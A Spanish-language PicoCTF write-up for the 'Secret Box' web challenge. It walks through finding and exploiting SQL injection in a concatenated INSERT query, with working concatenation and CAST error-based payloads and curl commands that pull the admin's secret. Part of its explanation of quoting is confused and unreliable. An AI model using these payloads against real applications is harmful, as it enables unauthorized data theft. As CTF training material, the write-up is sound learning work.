# Writeup: Secret_Box
**Categoría:** Medium
**Fecha de conversión:** 2026-04-24

---

Writeup: Secret Box (PicoCTF)

Descripción


La aplicación web permite a los usuarios registrarse, iniciar sesión y crear "secretos" (texto) que se almacenan en una base de datos. El objetivo es acceder al secreto del administrador, que contiene la flag.


Se proporciona una URL (por ejemplo, http://candy-mountain.picoctf.net:XXXXX) y un archivo source.tar.gz con el código fuente.

### Análisis inicial


```
    Exploración de la web

        Al acceder, vemos una página con un botón para crear secretos y un listado de los propios secretos.

        Los secretos se muestran con UUIDs aleatorios (ej. 50e7ffcf-ac8c-4826-8078-6f874ee4531e).

        No hay un endpoint público para ver secretos de otros usuarios.

    Pruebas de IDOR

        Probamos rutas como /secrets/0, /secrets/1, etc., pero obtenemos Cannot GET /secrets/0.

        También probamos /secrets/admin, /flag, /robots.txt sin éxito.

    Prueba de XSS

        Creamos un secreto con <script>alert(1)</script> y observamos que se ejecuta en la página principal.

        Esto indica que el campo content no se sanitiza, pero no hay un bot que visite la página, por lo que el XSS no nos ayuda a robar la cookie del admin.

    Descubrimiento de SQLi

        Al inyectar <script>alert('XSS')</script>, el servidor devuelve un error de sintaxis SQL:
        text

        error: INSERT INTO secrets(owner_id, content) VALUES ('...', '<script>alert('XSS')</script>') - syntax error at or near "XSS"

        Esto confirma que la aplicación construye la consulta concatenando directamente el contenido del secreto, siendo vulnerable a inyección SQL.

```

### Análisis del código fuente


Descargamos y extraemos source.tar.gz. Examinamos los archivos clave:


```
    db/initdb.sql
    Define las tablas users, tokens y secrets. El administrador tiene un id fijo:
    sql

    INSERT INTO users(id, username, password) VALUES ('e2a66f7d-2ce6-4861-b4aa-be8e069601cb', 'admin', 'fake_password');
    INSERT INTO secrets(owner_id, content) VALUES ('e2a66f7d-2ce6-4861-b4aa-be8e069601cb', 'picoCTF{fake_flag}');

    app/src/db.js
    Al iniciar, actualiza el secreto del admin con la flag real:
    javascript

    await db('secrets')
      .where({ owner_id: 'e2a66f7d-2ce6-4861-b4aa-be8e069601cb' })
      .update({ content: process.env.FLAG });

    app/src/server.js
    La ruta POST /secrets/create es vulnerable:
    javascript

    const query = await db.raw(
        `INSERT INTO secrets(owner_id, content) VALUES ('${userId}', '${content}')` 
    );

    No se usan parámetros ni escaping, lo que permite inyección SQL.

```

Estrategia de explotación


Necesitamos extraer el content del admin. Tenemos dos opciones:


```
    Error-based SQLi: Forzar un error de conversión de tipo para que el mensaje de error muestre la flag.

        Ejemplo: ' OR 1=CAST((SELECT content FROM secrets WHERE owner_id='...') AS int) --

        Problema: El servidor detecta estos payloads y responde con una redirección (302) y borra la cookie. Además, a veces la flag no se muestra por manejo de errores.

    Concatenación (Union-less): Hacer que la subconsulta se concatene con el resto de la cadena, insertando la flag como contenido de nuestro propio secreto.

        Payload: ' || (SELECT content FROM secrets WHERE owner_id='...') || '

        Esto no genera errores y nos permite leer la flag desde nuestra lista de secretos.

```

Optamos por la concatenación porque evita la redirección y la pérdida de sesión.

Construcción del payload


El payload debe cerrar la comilla simple inicial, concatenar el resultado de la subconsulta y luego abrir una nueva comilla simple para completar la sintaxis.


La subconsulta para obtener la flag del admin es:

sql


SELECT content FROM secrets WHERE owner_id='e2a66f7d-2ce6-4861-b4aa-be8e069601cb'


Dentro de la cadena del payload, debemos escapar las comillas simples. En PostgreSQL, se duplican. Por tanto, el payload final es:

text


' || (SELECT content FROM secrets WHERE owner_id=''e2a66f7d-2ce6-4861-b4aa-be8e069601cb'') || '


Pero en la práctica, al enviarlo con curl, observamos que también funciona con una sola comilla simple alrededor del UUID (posiblemente porque el contexto de la cadena ya está abierto). El payload que finalmente funcionó fue:

text


'||(SELECT content FROM secrets WHERE owner_id='e2a66f7d-2ce6-4861-b4aa-be8e069601cb')||'


Ejecución paso a paso


```
    Registrar un usuario y obtener cookie
    bash

    curl -X POST http://candy-mountain.picoctf.net:63915/signup -d "username=attacker&password=attacker"
    curl -c cookies.txt -X POST http://candy-mountain.picoctf.net:63915/login -d "username=attacker&password=attacker"

    Enviar el payload malicioso
    bash

    curl -b cookies.txt -X POST -d "content='||(SELECT content FROM secrets WHERE owner_id='e2a66f7d-2ce6-4861-b4aa-be8e069601cb')||'" http://candy-mountain.picoctf.net:63915/secrets/create

    El servidor responde con Found. Redirecting to / (sin error).

    Leer la flag desde la página principal
    bash

    curl -b cookies.txt http://candy-mountain.picoctf.net:63915/ | grep -oE "picoCTF\{[^}]+\}"

    Obtenemos:
    text

    picoCTF{*********************}

```

Problemas encontrados y soluciones

Problema	Solución

Intentos de IDOR con números o UUIDs no funcionan	El servidor no expone secretos por ID; hay que explotar SQLi.

XSS no es útil porque no hay bot	Descartado.

Los payloads con CAST causan redirección y pérdida de cookie	Se opta por concatenación, que no genera errores.

Dificultad con las comillas simples en el payload	Probar variantes: con una o dos comillas. El correcto se determinó experimentalmente.

La cookie no se guardaba inicialmente	Asegurarse de usar -c cookies.txt al hacer login y -b cookies.txt en las siguientes peticiones.

Lecciones aprendidas


```
    Siempre revisar el código fuente cuando está disponible. Revela la estructura de la base de datos y el punto exacto de vulnerabilidad.

    La concatenación directa en SQL es una vulnerabilidad crítica que permite leer datos arbitrarios.

    Los payloads de inyección deben ajustarse al contexto (comillas simples, concatenación, etc.). A veces la solución más sencilla (concatenar en lugar de forzar un error) es la más efectiva.

    Es fundamental mantener una sesión válida antes de explotar la vulnerabilidad.

```

### Flag final

text


picoCTF{*************************}




¿Cómo supe qué tipo de "código" inyectar?

1. El primer error me dio la pista

Cuando intenté guardar <script>alert('XSS')</script>, el servidor respondió con un error de SQL:

text


error: INSERT INTO secrets(...) VALUES (..., '<script>alert('XSS')</script>') - syntax error at or near "XSS"


Eso significa:


```
    La aplicación está pegando directamente mi texto dentro de una orden SQL.

    Las comillas simples (') son especiales en SQL: delimitan texto. Si aparecen dentro, rompen la sintaxis.

    La comilla que puse en alert('XSS') cerró la cadena antes de tiempo, causando el error.

```

Conclusión: Puedo inyectar órdenes SQL si uso comillas simples de forma inteligente.

2. Probé a cerrar la comilla y añadir mi propia orden

Para inyectar, primero necesito cerrar la comilla que el programa abre automáticamente. Ejemplo:


Si la consulta original es:

sql


INSERT INTO ... VALUES ('id', 'AQUÍ VA MI TEXTO')


Al escribir ' OR 1=1 -- , la consulta se convierte en:

sql


VALUES ('id', '' OR 1=1 -- ')


La primera comilla simple cierra la cadena, luego pongo mi condición OR 1=1, y -- comenta el resto. Esto es SQLi clásico.


Pero al hacer eso, el servidor a veces redirigía y borraba mi cookie. ¿Por qué? Porque el error que generaba hacía que el sistema se "asustara" y cerrara mi sesión.

3. ¿Por qué no funcionó el método de "forzar error con CAST"?

El método CAST(... AS int) intenta convertir el resultado de una subconsulta (que es texto) a número, y al fallar muestra el texto en el error. Ejemplo:

text


' OR 1=CAST((SELECT content FROM ...) AS int) --


Pero el servidor no mostraba el error, sino que redirigía a la página principal y borraba mi cookie. ¿Motivo? Los desarrolladores capturaron los errores y los manejaron con una redirección genérica. Así que ese camino no servía.

4. Opté por la concatenación silenciosa

En lugar de provocar un error, podemos pegar el resultado de la subconsulta al contenido que se guarda. En PostgreSQL, el operador || concatena textos.


Si escribo:

text


' || (SELECT content FROM ...) || '


La consulta final queda:

sql


VALUES ('id', '' || (secreto) || '')


Esto es perfectamente válido y no genera error. Simplemente guarda el secreto del admin como si fuera mi secreto.

5. El problema de las comillas simples

Dentro del SELECT necesito escribir owner_id='e2a66...'. La comilla simple que rodea al UUID podría confundirse con la comilla que ya estoy usando en el payload.


Probé dos opciones:


```
    Dos comillas: owner_id=''e2a66...'' → dio error de sintaxis porque '' es una cadena vacía seguida de letras sin operador.

    Una comilla: owner_id='e2a66...' → funcionó.

```

¿Por qué una comilla simple dentro de la subconsulta no interfiere? Porque los paréntesis de la subconsulta crean un ámbito separado. El SQL entiende que esa comilla pertenece a la subconsulta, no a la cadena principal.

6. ¿Cómo supe que era PostgreSQL?

```
    El código fuente usaba pg (node-postgres).

    Las funciones como gen_random_uuid() son de PostgreSQL.

    Los errores mencionaban pg-protocol.

```

Saber la base de datos ayuda a elegir operadores correctos (|| en lugar de + como en MySQL).

Resumen de "pistas" que me guiaron

Lo que vi	Lo que significa

Error de SQL al poner comillas simples	Hay inyección SQL

Las comillas simples rompen la sintaxis	Debo cerrar y abrir comillas con cuidado

Los payloads con CAST causan redirección	No puedo usar errores para extraer datos

El payload con || no da error y la flag aparece	La concatenación es el camino correcto

El UUID del admin está en el código fuente	Sé exactamente qué buscar


En definitiva, la experiencia en SQLi y la lectura de los errores (y de los aciertos silenciosos) me llevaron a probar distintas variantes hasta que una funcionó. La clave fue no rendirse ante los redireccionamientos y buscar un método que no alterara el flujo normal de la aplicación.

